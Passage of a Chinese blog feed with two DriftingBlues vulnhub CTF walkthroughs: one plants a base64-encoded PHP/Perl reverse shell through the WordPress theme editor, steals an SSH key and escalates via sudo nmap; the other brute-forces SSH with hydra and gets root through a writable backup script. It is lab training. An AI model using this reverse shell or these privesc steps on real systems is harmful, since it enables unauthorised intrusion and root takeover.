alt="image-20240205192337005"></p><p>我们看到报错了，看来是ip和域名没有绑定，我们进行绑定</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192500303.png" alt="image-20240205192500303"></p><p>我们再次访问,发现登录成功了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192753051.png" alt="image-20240205192753051"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192847079.png" alt="image-20240205192847079"></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4)反弹shell"></a>4)反弹shell</h3><p>我们进行查看，查找可以写入shell的地方，找到有一个404.php的页面可以编辑，此处使用php反弹shell的脚本，只需要修改ip和port为指定的值即可.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://driftingblues.box/blog/wp-admin/theme-editor.php?file<span class="token operator">=</span><span class="token number">404</span>.php<span class="token operator">&amp;</span><span class="token assign-left variable">theme</span><span class="token operator">=</span>twentytwentyone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192943683.png" alt="image-20240205192943683"></p><p>我们写入php反弹shell脚本，记得保存</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">which</span><span class="token punctuation">(</span><span class="token variable">$pr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"which <span class="token interpolation"><span class="token variable">$pr</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">?</span> <span class="token variable">$path</span> <span class="token punctuation">:</span> <span class="token variable">$pr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">execute</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">.=</span> @<span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">cf</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yourip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"your IP"</span><span class="token punctuation">;</span><span class="token variable">$yourport</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'your port'</span><span class="token punctuation">;</span><span class="token variable">$usedb</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'perl'</span><span class="token operator">=></span><span class="token string single-quoted-string">'perl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token operator">=></span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$back_connect</span><span class="token operator">=</span><span class="token string double-quoted-string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token operator">.</span><span class="token string double-quoted-string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token operator">.</span><span class="token string double-quoted-string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token operator">.</span><span class="token string double-quoted-string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token operator">.</span><span class="token string double-quoted-string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token operator">.</span><span class="token string double-quoted-string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span><span class="token function">cf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/.bc'</span><span class="token punctuation">,</span><span class="token variable">$back_connect</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'perl'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" /tmp/.bc <span class="token interpolation"><span class="token variable">$yourip</span></span> <span class="token interpolation"><span class="token variable">$yourport</span></span> &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193435417.png" alt="image-20240205193435417"></p><p>然后，我们访问一个不存在的页面即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://driftingblues.box/blog/index.php/MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193750358.png" alt="image-20240205193750358"></p><p>我们看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193902136.png" alt="image-20240205193902136"></p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们使用sudo -l 查看提权，发现需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194048378.png" alt="image-20240205194048378"></p><p>我们查看一些目录——&#x2F;home&#x2F;,&#x2F;tmp&#x2F;,&#x2F;var,&#x2F;var&#x2F;www&#x2F;html</p><p>我们切换的&#x2F;home&#x2F;,发现一个用户freddie，进入用户目录，有一个txt文件，但没有权限查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194257431.png" alt="image-20240205194257431"></p><p>我们还看到.ssh文件夹, 进入.ssh文件夹中，发现一对公私钥对，其中私钥有可读权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194500332.png" alt="image-20240205194500332"></p><p>我们复制到kali里面，并修改权限为400</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194635713.png" alt="image-20240205194635713"></p><p> 使用私钥免密登录，可以成功登录为用户freddie,我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194813153.png" alt="image-20240205194813153"></p><p>得到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194845378.png" alt="image-20240205194845378"></p><p>查看sudo权限的命令，发现有一个nmap命令可以无密码root使用，用于提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195052568.png" alt="image-20240205195052568"></p><p>根据使用nmap提权的方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://gtfobins.github.io/gtfobins/nmap/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195214901.png" alt="image-20240205195214901"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> <span class="token variable">$TF</span><span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span><span class="token operator">=</span><span class="token variable">$TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195432631.png" alt="image-20240205195432631"></p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.ssh登录</p><p>10.图片隐写</p><p>11.wpscan爆破</p><p>12.nmap提权方式</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-1</title>
    <link href="http://ms02423.top/2024/02/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-1/"/>
    <id>http://ms02423.top/2024/02/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-1/</id>
    <published>2024-02-04T11:49:11.000Z</published>
    <updated>2024-02-05T10:42:18.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token punctuation">(</span>it should be <span class="token keyword">on</span> my profile<span class="token punctuation">)</span> <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-1,625/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195436736.png" alt="image-20240204195436736"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195517626.png" alt="image-20240204195517626"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip地址"><a href="#1-寻找靶场真实ip地址" class="headerlink" title="1.寻找靶场真实ip地址"></a>1.寻找靶场真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195743518.png" alt="image-20240204195743518"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195833130.png" alt="image-20240204195833130"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200036360.png" alt="image-20240204200036360"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>2p2 Ubuntu 4ubuntu2<span class="token punctuation">.</span><span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.18</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200253063.png" alt="image-20240204200253063"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200348375.png" alt="image-20240204200348375"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200501925.png" alt="image-20240204200501925"></p><p>没有信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200635070.png" alt="image-20240204200635070"></p><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.6 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200950837.png" alt="image-20240204200950837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200931801.png" alt="image-20240204200931801"></p><p>截止到目前，我们没有扫描到如何有用的信息，我们想想还有什么办法，突然想到源代码我们没有查看，我们进行查看</p><h3 id="4-查看源代码"><a href="#4-查看源代码" class="headerlink" title="4)查看源代码"></a>4)查看源代码</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201131720.png" alt="image-20240204201131720"></p><p>我们找了很久，找到一个base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201440212.png" alt="image-20240204201440212"></p><p>解密之后，是一个目录</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问目录"><a href="#1-访问目录" class="headerlink" title="1)访问目录"></a>1)访问目录</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.6&#x2F;noteforkingfish.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201835321.png" alt="image-20240204201835321"></p><h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2)解密"></a>2)解密</h3><p>我们看到是一个Ook编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202328901.png" alt="image-20240204202328901"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202358528.png" alt="image-20240204202358528"></p><p>提示我们修改主机文件，那么我们进行修改</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202442278.png" alt="image-20240204202442278"></p><h3 id="3-修改主机文件"><a href="#3-修改主机文件" class="headerlink" title="3)修改主机文件"></a>3)修改主机文件</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202636502.png" alt="image-20240204202636502"></p><p>然后我们进行扫描域名</p><h3 id="4-gobuster扫描"><a href="#4-gobuster扫描" class="headerlink" title="4)gobuster扫描"></a>4)gobuster扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster vhost <span class="token parameter variable">-u</span> driftingblues.box <span class="token parameter variable">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215145797.png" alt="image-20240204215145797"></p><p> 重新修改&#x2F;etc&#x2F;hosts，添加为192.168.1.6 test.driftingblues.box，然后再后访问test.driftingblues.box</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215411095.png" alt="image-20240204215411095"></p><p>我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;test.driftingblues.box&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215534082.png" alt="image-20240204215534082"></p><p>扫描到一个eric，我们先记一下</p><h3 id="5-dirsearch扫描域名"><a href="#5-dirsearch扫描域名" class="headerlink" title="5)dirsearch扫描域名"></a>5)dirsearch扫描域名</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dirsearch <span class="token parameter variable">-u</span> http://test.driftingblues.box/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215950863.png" alt="image-20240204215950863"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220019202.png" alt="image-20240204220019202"></p><h3 id="6-robots-txt"><a href="#6-robots-txt" class="headerlink" title="6)robots.txt"></a>6)robots.txt</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://test.driftingblues.box/ssh_cred.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220104846.png" alt="image-20240204220104846"></p><p>可能跟ssh登录有关系，果然是ssh登录的密码，不过末尾有数字，其他的都是404</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220202624.png" alt="image-20240204220202624"></p><p>发现这里有个提示：这个的密码需要最后一位加一个数字才是正真的密码 这样的话就有十种可能 所以自己自定义个字典 把十种可能写进去</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220545518.png" alt="image-20240204220545518"></p><p>既然说了是ssh登录的密码，那么我们就进行暴力破解</p><h3 id="7-hydra暴力破解"><a href="#7-hydra暴力破解" class="headerlink" title="7)hydra暴力破解"></a>7)hydra暴力破解</h3><p>猜测刚刚的提示 账号是 eric使用工具hydra尝试暴力破解，得到密码为：1mw4ckyyucky6 使用ssh 登入即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> eric <span class="token parameter variable">-P</span> <span class="token string">'/home/kali/桌面/MS02423.txt'</span>  <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.6 <span class="token function">ssh</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220902417.png" alt="image-20240204220902417"></p><p>我们看到爆破成功，我们进行登录</p><h3 id="8-ssh登录"><a href="#8-ssh登录" class="headerlink" title="8)ssh登录"></a>8)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> eric@192.168.1.6 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221032399.png" alt="image-20240204221032399"></p><h3 id="9-提权"><a href="#9-提权" class="headerlink" title="9)提权"></a>9)提权</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221247919.png" alt="image-20240204221247919"></p><p>我们发现不行，我们查看根目录下的内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221408468.png" alt="image-20240204221408468"></p><p>我们找到了第一个flag</p><p>到这里，就没有思路了，但是一般情况下，我们会查看的几个目录:home,tmp,&#x2F;var&#x2F;www&#x2F;html&#x2F;,var</p><p>我们一个一个进行查看，在&#x2F;var&#x2F;里面发现了backups</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222115648.png" alt="image-20240204222115648"></p><p>我们进行查看,在&#x2F;var&#x2F;backups这个备份文件夹中找到一个.sh脚本文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222213298.png" alt="image-20240204222213298"></p><p>backup.sh的内容就是用zip命令把&#x2F;var&#x2F;www目录下的所有内容打包为&#x2F;tmp&#x2F;backup.zip，然后sudo &#x2F;tmp&#x2F;emergency,在前面&#x2F;tmp中找到了这个压缩文件，但是并没有找到emergency文件,需要创建emergency文件，并将eric用户加入sudo组</p><pre class="line-numbers language-none"><code class="language-none">echo &#39;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;getroot; chmod +s &#x2F;tmp&#x2F;getroot&#39; &gt; &#x2F;tmp&#x2F;emergencychmod +x emergency .&#x2F;getroot -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222747642.png" alt="image-20240204222747642"></p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222837963.png" alt="image-20240204222837963"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222856899.png" alt="image-20240204222856899"></p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] 